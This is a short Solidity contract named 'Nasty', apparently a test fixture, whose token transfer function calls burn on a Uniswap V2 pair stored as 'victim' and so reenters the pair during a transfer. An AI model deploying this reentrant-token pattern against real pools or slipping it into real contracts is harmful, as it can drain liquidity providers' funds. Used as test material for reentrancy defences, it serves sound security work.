pragma solidity ^0.5.15;

import "ds-math/math.sol";

contract Nasty {
    mapping(address => uint) public balanceOf;
    address public victim;

    function transfer(address to, uint value) external returns (bool) {
        balanceOf[msg.sender] = DSMath.sub(balanceOf[msg.sender], value);
        balanceOf[to] = DSMath.add(balanceOf[to], value);

        UniswapV2Pair(victim).burn(to);

        return true;
    }
}
